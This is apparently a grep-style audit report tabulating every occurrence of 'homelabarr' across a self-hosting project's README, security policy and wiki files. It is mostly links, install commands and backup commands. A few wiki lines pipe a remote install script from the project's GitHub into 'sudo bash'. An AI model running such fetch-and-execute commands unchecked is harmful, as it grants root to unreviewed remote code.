| `README.md` | 21 | `    <a href="https://wiki.homelabarr.com">` |
| `README.md` | 24 | `    <a href="https://www.reddit.com/r/homelabarr/">` |
| `README.md` | 25 | `        <img src="https://img.shields.io/badge/Reddit-r/homelabarr-FF4500?logo=reddit&logoColor=white" alt="Reddit">` |
| `README.md` | 30 | `    <a href="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/docker-build-push.yml">` |
| `README.md` | 31 | `        <img src="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/docker-build-push.yml/badge.svg" alt="Do` |
| `README.md` | 33 | `    <a href="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/security-audit.yml">` |
| `README.md` | 34 | `        <img src="https://github.com/imogenlabs/homelabarr-ce/actions/workflows/security-audit.yml/badge.svg" alt="Secur` |
| `README.md` | 39 | `    <a href="https://ce-demo.homelabarr.com">` |
| `README.md` | 42 | `    <a href="https://homelabarr.com">` |
| `README.md` | 43 | `        <img src="https://img.shields.io/badge/Website-homelabarr.com-FF8C1A?logo=firefox&logoColor=white" alt="HomelabA` |
| `README.md` | 70 | `Don't want to install anything yet? [**Open the live demo →**](https://ce-demo.homelabarr.com)` |
| `README.md` | 82 | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `README.md` | 83 | `cd /opt/homelabarr` |
| `README.md` | 91 | `docker compose -f homelabarr.yml up -d` |
| `README.md` | 96 | `> **For a permanent setup**, move those exports into a '.env' file. See the [configuration docs](https://wiki.homelabarr` |
| `README.md` | 100 | `Want to build from source? See the [full install guide](https://wiki.homelabarr.com/guides/quick-start/).` |
| `README.md` | 150 | `Want the deep dive? [Architecture docs →](https://wiki.homelabarr.com/guides/architecture/)` |
| `README.md` | 169 | `\| **Disclosure** \| [SECURITY.md](SECURITY.md) + [/.well-known/security.txt](https://ce-demo.homelabarr.com/.well-known` |
| `README.md` | 184 | `2. **Verify image signatures:** 'cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-` |
| `README.md` | 185 | `3. **Start the stack:** 'docker compose -f homelabarr.yml up -d'` |
| `README.md` | 206 | `All options: [wiki.homelabarr.com/guides/configuration](https://wiki.homelabarr.com/guides/configuration/)` |
| `README.md` | 213 | `homelabarr-ce/` |
| `README.md` | 227 | `├── wiki/             # Source for wiki.homelabarr.com (MkDocs)` |
| `README.md` | 231 | `├── homelabarr.yml    # Production Docker Compose` |
| `README.md` | 279 | `\| **Website** \| [homelabarr.com](https://homelabarr.com) \|` |
| `README.md` | 280 | `\| **Docs** \| [wiki.homelabarr.com](https://wiki.homelabarr.com) \|` |
| `README.md` | 281 | `\| **Demo** \| [ce-demo.homelabarr.com](https://ce-demo.homelabarr.com) — log in with admin / admin \|` |
| `README.md` | 282 | `\| **Security** \| [SECURITY.md](SECURITY.md) · [/.well-known/security.txt](https://ce-demo.homelabarr.com/.well-known/` |
| `README.md` | 283 | `\| **Discord** \| [discord.gg/Pc7mXX786x](https://discord.gg/Pc7mXX786x) \|` |
| `README.md` | 284 | `\| **Reddit** \| [r/homelabarr](https://www.reddit.com/r/homelabarr/) \|` |
| `README.md` | 294 | `    <td align="center"><a href="https://github.com/smashingtags"><img src="https://avatars.githubusercontent.com/u/48292` |
| `SECURITY.md` | 11 | `\| Latest release \| Yes — see [Releases](https://github.com/imogenlabs/homelabarr-ce/releases/latest) \|` |
| `SECURITY.md` | 79 | `- Backend container runs as non-root user ('homelabarr:1001')` |
| `SECURITY.md` | 144 | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `SECURITY.md` | 146 | `  ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `SECURITY.md` | 153 | `  ghcr.io/imogenlabs/homelabarr-backend:<tag> \` |
| `SECURITY.md` | 163 | `- 'docker inspect homelabarr-backend' shows 'ReadonlyRootfs: true' and 'CapDrop: [ALL]'` |
| `SECURITY.md` | 207 | `Email **michael@mjashley.com** or open a [GitHub Security Advisory](https://github.com/imogenlabs/homelabarr-ce/security` |
| `SECURITY.md` | 218 | `We will not pursue legal action against good-faith security research that limits testing to ce-demo.homelabarr.com or yo` |
| `SECURITY.md` | 223 | `Traefik, frontend, backend, and socket-proxy all on the same Docker host. The 'homelabarr-internal' bridge network is th` |
| `SECURITY.md` | 240 | `git clone https://github.com/imogenlabs/homelabarr-ce && cd homelabarr-ce` |
| `SECURITY.md` | 244 | `cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `SECURITY.md` | 246 | `  ghcr.io/imogenlabs/homelabarr-backend:v2.3.0` |
| `SECURITY.md` | 248 | `docker cp <backup.db> homelabarr-backend:/app/data/homelabarr.db` |
| `SECURITY.md` | 273 | `- https://ce-demo.homelabarr.com/.well-known/security.txt (RFC 9116)` |

## Wiki content

**196 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `wiki/docs/CNAME` | 1 | `wiki.homelabarr.com` |
| `wiki/docs/guides/api-reference.md` | 5 | `**Base URL:** 'https://homelabarr.YOUR-DOMAIN/api/' (behind Traefik — recommended)` |
| `wiki/docs/guides/architecture.md` | 104 | `homelabarr-data/        # Docker volume — HomelabARR settings (users, sessions)` |
| `wiki/docs/guides/cli-installation.md` | 10 | `curl -fsSL https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `wiki/docs/guides/cli-installation.md` | 14 | `    You can [review the full script](https://github.com/imogenlabs/homelabarr-ce/blob/main/install-remote.sh) before run` |
| `wiki/docs/guides/cli-installation.md` | 19 | `2. Download the HomelabARR repo to '/opt/homelabarr'` |
| `wiki/docs/guides/cli-installation.md` | 46 | `cd /opt/homelabarr` |
| `wiki/docs/guides/cli-installation.md` | 52 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/configuration.md` | 57 | `\| 'CLI_BRIDGE_HOST_PATH' \| '/opt/homelabarr' \| Path to the repo with app templates (must contain 'apps/') \|` |
| `wiki/docs/guides/configuration.md` | 63 | `Instead of typing 'export' commands every time — which only last until you close your terminal — save your settings ` |
| `wiki/docs/guides/configuration.md` | 92 | `docker compose -f homelabarr.yml --env-file .env up -d` |
| `wiki/docs/guides/configuration.md` | 114 | `- 'homelabarr-data' — app data and logs` |
| `wiki/docs/guides/configuration.md` | 115 | `- 'homelabarr-config' — user accounts, API keys, and sessions ('/app/server/config/')` |
| `wiki/docs/guides/configuration.md` | 130 | `All auth data is stored in '/app/server/config/' inside the backend container, persisted by the 'homelabarr-config' volu` |
| `wiki/docs/guides/contributing.md` | 8 | `- Report issues through [GitHub Issues](https://github.com/imogenlabs/homelabarr-ce/issues)` |
| `wiki/docs/guides/contributing.md` | 52 | `git clone https://github.com/YOUR_USERNAME/homelabarr-ce.git` |
| `wiki/docs/guides/contributing.md` | 53 | `cd homelabarr-ce` |
| `wiki/docs/guides/contributing.md` | 56 | `git remote add upstream https://github.com/imogenlabs/homelabarr-ce.git` |
| `wiki/docs/guides/contributing.md` | 384 | `We follow the [Contributor Covenant Code of Conduct](https://github.com/imogenlabs/homelabarr-ce/blob/main/.github/CODE_` |
| `wiki/docs/guides/contributing.md` | 387 | `- **Discord**: [HomelabARR Community](https://discord.gg/Pc7mXX786x)` |
| `wiki/docs/guides/contributing.md` | 436 | `**☕ [Support on Ko-fi](https://ko-fi.com/homelabarr)** - Help fund development time, infrastructure costs, and project` |
| `wiki/docs/guides/faq.md` | 37 | `CE (Community Edition) is 100% free and open source under the MIT license. There's also a paid [HomelabARR Mobile](https` |
| `wiki/docs/guides/faq.md` | 48 | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/faq.md` | 59 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/faq.md` | 85 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/faq.md` | 160 | `- **HomelabARR settings** (users, sessions): 'homelabarr-data' Docker volume` |
| `wiki/docs/guides/faq.md` | 165 | `sudo tar -czf homelabarr-backup-$(date +%Y%m%d).tar.gz /opt/appdata/` |
| `wiki/docs/guides/faq.md` | 171 | `docker compose -f homelabarr.yml pull` |
| `wiki/docs/guides/faq.md` | 172 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/faq.md` | 215 | `- **[Discord](https://discord.gg/Pc7mXX786x)** — fastest, someone's usually around — ask in #help` |
| `wiki/docs/guides/faq.md` | 216 | `- **[GitHub Issues](https://github.com/imogenlabs/homelabarr-ce/issues)** — bug reports` |
| `wiki/docs/guides/faq.md` | 217 | `- **[GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)** — questions and feature requests` |
| `wiki/docs/guides/faq.md` | 218 | `- **[homelabarr.com](https://homelabarr.com)** — product page` |
| `wiki/docs/guides/migration.md` | 27 | `    sudo tar czf /opt/homelabarr-backup-$(date +%Y%m%d).tar.gz /opt/appdata/` |
| `wiki/docs/guides/migration.md` | 38 | `    ls -lh /opt/homelabarr-backup-*.tar.gz` |
| `wiki/docs/guides/migration.md` | 49 | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/migration.md` | 50 | `cd /opt/homelabarr` |
| `wiki/docs/guides/migration.md` | 58 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/migration.md` | 314 | `- **[Discord](https://discord.gg/Pc7mXX786x)** — Ask in #help, someone's usually around` |
| `wiki/docs/guides/migration.md` | 315 | `- **[GitHub Discussions](https://github.com/imogenlabs/homelabarr-ce/discussions)** — For longer questions` |
| `wiki/docs/guides/mobile-app.md` | 24 | `\| **Build from source** \| Always free \| [github.com/imogenlabs/homelabarr-mobile](https://github.com/imogenlabs/homel` |
| `wiki/docs/guides/mobile-app.md` | 41 | `\| Traefik + domain \| 'https://homelabarr.yourdomain.com' \|` |
| `wiki/docs/guides/mobile-app.md` | 42 | `\| Cloudflare Tunnel \| 'https://homelabarr.yourdomain.com' \|` |
| `wiki/docs/guides/mobile-app.md` | 64 | `- Is your CE server running? Check: 'docker ps \| grep homelabarr'` |
| `wiki/docs/guides/mobile-app.md` | 80 | `- **Source:** [github.com/imogenlabs/homelabarr-mobile](https://github.com/imogenlabs/homelabarr-mobile)` |
| `wiki/docs/guides/mobile-app.md` | 86 | `- **URL:** 'https://ce-demo.homelabarr.com'` |
| `wiki/docs/guides/quick-start.md` | 46 | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/guides/quick-start.md` | 49 | `This downloads the entire repo — including all 100+ app templates — to '/opt/homelabarr'. The 'apps/' folder inside ` |
| `wiki/docs/guides/quick-start.md` | 54 | `cd /opt/homelabarr` |
| `wiki/docs/guides/quick-start.md` | 84 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/quick-start.md` | 132 | `curl -fsSL https://raw.githubusercontent.com/imogenlabs/homelabarr-ce/main/install-remote.sh \| sudo bash` |
| `wiki/docs/guides/quick-start.md` | 136 | `    You can [review the script](https://github.com/imogenlabs/homelabarr-ce/blob/main/install-remote.sh) before running ` |
| `wiki/docs/guides/quick-start.md` | 141 | `2. Clone the repo to '/opt/homelabarr'` |
| `wiki/docs/guides/quick-start.md` | 176 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/quick-start.md` | 189 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/guides/security.md` | 3 | `HomelabARR CE ships with a production-grade security envelope by default. This page summarizes the controls that are act` |
| `wiki/docs/guides/security.md` | 40 | `- **GitHub:** [Security Advisories](https://github.com/imogenlabs/homelabarr-ce/security/advisories/new)` |
| `wiki/docs/guides/security.md` | 41 | `- **Machine-readable:** [/.well-known/security.txt](https://ce-demo.homelabarr.com/.well-known/security.txt) (RFC 9116)` |
| `wiki/docs/guides/security.md` | 47 | `- **Threat model:** [docs/threat-model/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/threat-model) — as` |
| `wiki/docs/guides/security.md` | 48 | `- **Incident response:** [docs/ir/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/ir) — 11 playbooks cove` |
| `wiki/docs/guides/security.md` | 49 | `- **Compliance posture:** [compliance/](https://github.com/imogenlabs/homelabarr-ce/tree/main/compliance) — CIS Docker` |
| `wiki/docs/guides/security.md` | 50 | `- **Audit trail:** [docs/audit/](https://github.com/imogenlabs/homelabarr-ce/tree/main/docs/audit) — 18 rounds, 201+ f` |
| `wiki/docs/guides/security.md` | 51 | `- **Dependency policy:** [docs/governance/dependency-update-policy.md](https://github.com/imogenlabs/homelabarr-ce/blob/` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 49 | `    ax.text(0.99, 0.015, 'homelabarr.com  \|  Imogen Labs',` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 67 | `    ax.text(0.5, 0.97, 'HOMELABARR CE  --  SYSTEM ARCHITECTURE',` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 82 | `        'https://homelabarr.YOUR-DOMAIN', color=FLOW, fs=14, sub_fs=10, sub_gap=0.02)` |
| `wiki/docs/img/diagrams/generate_diagrams.py` | 153 | `    ax.text(0.17, 0.115, 'homelabarr-data', fontsize=8,` |
| `wiki/docs/index.md` | 25 | `git clone https://github.com/imogenlabs/homelabarr-ce.git /opt/homelabarr` |
| `wiki/docs/index.md` | 26 | `cd /opt/homelabarr` |
| `wiki/docs/index.md` | 34 | `docker compose -f homelabarr.yml up -d` |
| `wiki/docs/index.md` | 87 | `- [HomelabARR](https://homelabarr.com) — Product home` |
| `wiki/docs/index.md` | 88 | `- [GitHub](https://github.com/imogenlabs/homelabarr-ce)` |
| `wiki/docs/index.md` | 89 | `- [Discord](https://discord.gg/Pc7mXX786x) — Get help, share your setup` |
| `wiki/docs/index.md` | 90 | `- [Demo](https://ce-demo.homelabarr.com) — Try it live (login: admin/admin)` |
| `wiki/docs/install/changelog.md` | 21 | `- **Container delete/stop/restart**: Docker client was never passed to the CLI manager. All container operations now wor` |
| `wiki/docs/install/changelog.md` | 22 | `- **Docker socket permissions**: Apps that mount 'docker.sock' (Portainer, etc.) now get 'group_add' injected at deploy ` |
| `wiki/docs/install/changelog.md` | 23 | `- **Read-only template volumes**: Temp deploy YAMLs now write to 'server/data/' instead of next to the source YAML, so d` |
| `wiki/docs/install/changelog.md` | 24 | `- **Deploy progress stream**: SSE 'connected' event now includes the server-assigned 'clientId', fixing "Client not foun` |
| `wiki/docs/install/changelog.md` | 27 | `- **npm vulnerabilities patched**: vite, hono, @hono/node-server bumped to address 9 advisories (3 high, 6 moderate). ([` |
| `wiki/docs/install/changelog.md` | 28 | `- **Workflow permissions**: Added explicit 'permissions: contents: read' to all workflows missing it. Resolves CodeQL al` |
| `wiki/docs/install/changelog.md` | 31 | `- **Wiki cleanup**: Removed Professional Edition section; replaced placeholder octopus with optimized v3b WebP at proper` |
| `wiki/mkdocs.yml` | 4 | `site_url: "https://wiki.homelabarr.com"` |
| `wiki/mkdocs.yml` | 10 | `repo_url: https://github.com/imogenlabs/homelabarr-ce` |
| `wiki/mkdocs.yml` | 11 | `edit_uri: https://github.com/imogenlabs/homelabarr-ce/edit/main/wiki/docs/` |
| `wiki/mkdocs.yml` | 78 | `      link: https://homelabarr.com` |
| `wiki/mkdocs.yml` | 81 | `      link: https://github.com/imogenlabs/homelabarr-ce` |
| `wiki/mkdocs.yml` | 84 | `      link: https://discord.gg/Pc7mXX786x` |
| `wiki/mkdocs.yml` | 87 | `      link: https://github.com/imogenlabs/homelabarr-ce/discussions` |
| `wiki/site/404.html` | 404 | `  </style><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googl` |
| `wiki/site/CNAME` | 1 | `wiki.homelabarr.com` |
| `wiki/site/guides/_white-label-audit/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/_white-label-audit/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/api-reference/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/api-reference/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/api-reference/index.html` | 509 | `</code></pre></div> <p>Common codes: <code>400</code> bad request, <code>401</code> not authenticated, <code>403</code> ` |
| `wiki/site/guides/architecture/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/architecture/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/architecture/index.html` | 450 | `homelabarr-data/        # Docker volume — HomelabARR settings (users, sessions)` |
| `wiki/site/guides/architecture/index.html` | 452 | `</code></pre></div> <p>When code merges to <code>main</code>, GitHub Actions: 1. Builds multi-arch Docker images (amd64 ` |
| `wiki/site/guides/cli-bridge/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/cli-bridge/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/cli-bridge/index.html` | 444 | `</code></pre></div> <h3 id=available-variables>Available Variables<a class=headerlink href=#available-variables title="P` |
| `wiki/site/guides/cli-installation/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/cli-installation/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/cli-installation/index.html` | 415 | `</code></pre></div> <div class="admonition info"> <p class=admonition-title>What this script does</p> <p>You can <a href` |
| `wiki/site/guides/cli-installation/index.html` | 421 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/cli-installation/index.html` | 422 | `</code></pre></div> <p>Open <code>http://YOUR-SERVER-IP:8084</code> — any containers you deployed via CLI will already` |
| `wiki/site/guides/configuration/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/configuration/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/configuration/index.html` | 426 | `</code></pre></div> </div> <p>Start HomelabARR with your .env file:</p> <div class=highlight><pre><span></span><code>doc` |
| `wiki/site/guides/configuration/index.html` | 433 | `</code></pre></div> <p>Each app gets its own folder. <strong>This is what you back up.</strong></p> <p><strong>HomelabAR` |
| `wiki/site/guides/configuration/index.html` | 434 | `</code></pre></div> <p>See the <a href=../traefik-setup/ >Traefik &amp; Domain Setup</a> guide for the full walkthrough.` |
| `wiki/site/guides/contributing/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/contributing/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/contributing/index.html` | 421 | `git<span class=w> </span>clone<span class=w> </span>https://github.com/YOUR_USERNAME/homelabarr-ce.git` |
| `wiki/site/guides/contributing/index.html` | 422 | `<span class=nb>cd</span><span class=w> </span>homelabarr-ce` |
| `wiki/site/guides/contributing/index.html` | 425 | `git<span class=w> </span>remote<span class=w> </span>add<span class=w> </span>upstream<span class=w> </span>https://gith` |
| `wiki/site/guides/contributing/index.html` | 598 | `</code></pre></div><p></p> </li> <li> <p><strong>Submit Pull Request</strong></p> </li> <li>Use descriptive title</li> <` |
| `wiki/site/guides/faq/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/faq/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/faq/index.html` | 416 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/faq/index.html` | 421 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/faq/index.html` | 429 | `</code></pre></div> <hr> <h2 id=security>Security<a class=headerlink href=#security title="Permanent link">¶</a></h2> <` |
| `wiki/site/guides/faq/index.html` | 430 | `</code></pre></div> <h3 id=how-do-i-update-to-the-latest-version>How do I update to the latest version?<a class=headerli` |
| `wiki/site/guides/faq/index.html` | 431 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/faq/index.html` | 445 | `</code></pre></div> <p>Refresh the dashboard and your app shows up in <strong>My Apps</strong>. See <a href=../cli-bridg` |
| `wiki/site/guides/history/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/history/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/migration/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/migration/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/migration/index.html` | 415 | `sudo<span class=w> </span>tar<span class=w> </span>czf<span class=w> </span>/opt/homelabarr-backup-<span class=k>$(</spa` |
| `wiki/site/guides/migration/index.html` | 422 | `</code></pre></div> <p>Verify the backup completed before continuing: </p><div class=highlight><pre><span></span><code>l` |
| `wiki/site/guides/migration/index.html` | 423 | `</code></pre></div><p></p> </div> <hr> <h2 id=step-1-install-homelabarr-ce>Step 1: Install HomelabARR CE<a class=headerl` |
| `wiki/site/guides/migration/index.html` | 424 | `git<span class=w> </span>clone<span class=w> </span>https://github.com/imogenlabs/homelabarr-ce.git<span class=w> </span` |
| `wiki/site/guides/migration/index.html` | 425 | `<span class=nb>cd</span><span class=w> </span>/opt/homelabarr` |
| `wiki/site/guides/migration/index.html` | 433 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/migration/index.html` | 479 | `</code></pre></div> <div class="admonition tip"> <p class=admonition-title>Keep your rclone config</p> <p>Even if you mo` |
| `wiki/site/guides/mobile-app/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/mobile-app/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/quick-start/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/quick-start/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/quick-start/index.html` | 418 | `</code></pre></div> <p>If both commands print a version number, you're good. If not, check the <a href=https://docs.dock` |
| `wiki/site/guides/quick-start/index.html` | 419 | `</code></pre></div> <p>This downloads the entire repo — including all 100+ app templates — to <code>/opt/homelabarr<` |
| `wiki/site/guides/quick-start/index.html` | 423 | `</code></pre></div> <div class="admonition warning"> <p class=admonition-title>Replace YOUR-SERVER-IP — both times</p>` |
| `wiki/site/guides/quick-start/index.html` | 425 | `</code></pre></div> <p>You should see the HomelabARR dashboard with 100+ apps ready to deploy.</p> <h3 id=step-6-log-in-` |
| `wiki/site/guides/quick-start/index.html` | 426 | `</code></pre></div> <div class="admonition info"> <p class=admonition-title>What this script does</p> <p>You can <a href` |
| `wiki/site/guides/quick-start/index.html` | 430 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/quick-start/index.html` | 436 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/quick-start/index.html` | 440 | `</code></pre></div> <p>Replace <code>YOUR-VMID</code> with your container's ID number (like <code>100</code> or <code>99` |
| `wiki/site/guides/traefik-setup/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/traefik-setup/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/traefik-setup/index.html` | 478 | `</code></pre></div> <p>The key piece is the <code>chain-authelia</code> middleware definition. HomelabARR's <strong>Trae` |
| `wiki/site/guides/traefik-setup/index.html` | 479 | `</code></pre></div> <p>to the container's labels. No manual config per app — HomelabARR handles it.</p> <hr> <h2 id=cf` |
| `wiki/site/guides/web-dashboard/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/web-dashboard/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/web-dashboard/index.html` | 428 | `</code></pre></div> <p>Refresh the dashboard — your app shows up in the <strong>My Apps</strong> tab. You can use the ` |
| `wiki/site/guides/white-label/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/guides/white-label/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/guides/white-label/index.html` | 417 | `<span class=nv>OLD_NAME</span><span class=o>=</span><span class=s2>"homelabarr"</span><span class=w>         </span><spa` |
| `wiki/site/guides/white-label/index.html` | 422 | `<span class=nv>OLD_REPO</span><span class=o>=</span><span class=s2>"smashingtags/homelabarr-ce"</span>` |
| `wiki/site/guides/white-label/index.html` | 425 | `<span class=nv>OLD_DOMAIN</span><span class=o>=</span><span class=s2>"homelabarr.com"</span>` |
| `wiki/site/guides/white-label/index.html` | 428 | `<span class=nv>OLD_WIKI</span><span class=o>=</span><span class=s2>"wiki.homelabarr.com"</span>` |
| `wiki/site/guides/white-label/index.html` | 477 | `</code></pre></div> <hr> <h2 id=building-your-own-container-images>Building your own container images<a class=headerlink` |
| `wiki/site/guides/white-label/index.html` | 482 | `grep<span class=w> </span>-ri<span class=w> </span><span class=s2>"homelabarr"</span><span class=w> </span>dist/<span cl` |
| `wiki/site/guides/white-label/index.html` | 485 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/guides/white-label/index.html` | 489 | `grep<span class=w> </span>-ri<span class=w> </span><span class=s2>"homelabarr"</span><span class=w> </span>--exclude-dir` |
| `wiki/site/guides/white-label/index.html` | 490 | `</code></pre></div> <p>The final grep should mostly return hits in <code>wiki/docs/guides/history.md</code>, <code>LICEN` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 49 | `    ax.text(0.99, 0.015, 'homelabarr.com  \|  Imogen Labs',` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 67 | `    ax.text(0.5, 0.97, 'HOMELABARR CE  --  SYSTEM ARCHITECTURE',` |
| `wiki/site/img/diagrams/generate_diagrams.py` | 153 | `    ax.text(0.17, 0.115, 'homelabarr-data', fontsize=8,` |
| `wiki/site/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/index.html` | 415 | `git<span class=w> </span>clone<span class=w> </span>https://github.com/imogenlabs/homelabarr-ce.git<span class=w> </span` |
| `wiki/site/index.html` | 416 | `<span class=nb>cd</span><span class=w> </span>/opt/homelabarr` |
| `wiki/site/index.html` | 424 | `docker<span class=w> </span>compose<span class=w> </span>-f<span class=w> </span>homelabarr.yml<span class=w> </span>up<` |
| `wiki/site/index.html` | 425 | `</code></pre></div> <p>Open <strong>http://YOUR-SERVER-IP:8084</strong> and log in with <code>admin</code> / <code>admin` |
| `wiki/site/install/changelog/index.html` | 1 | `<!DOCTYPE html><html lang=en class=no-js><head><meta charset=utf-8><meta name=viewport content="width=device-width,initi` |
| `wiki/site/install/changelog/index.html` | 414 | `        </style></head> <body dir=ltr data-md-color-scheme=slate data-md-color-primary=black data-md-color-accent=blue> ` |
| `wiki/site/search/search_index.json` | 1 | `{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text"` |
| `wiki/site/sitemap.xml` | 4 | `         <loc>https://wiki.homelabarr.com/</loc>` |
| `wiki/site/sitemap.xml` | 8 | `         <loc>https://wiki.homelabarr.com/guides/_white-label-audit/</loc>` |
| `wiki/site/sitemap.xml` | 12 | `         <loc>https://wiki.homelabarr.com/guides/api-reference/</loc>` |
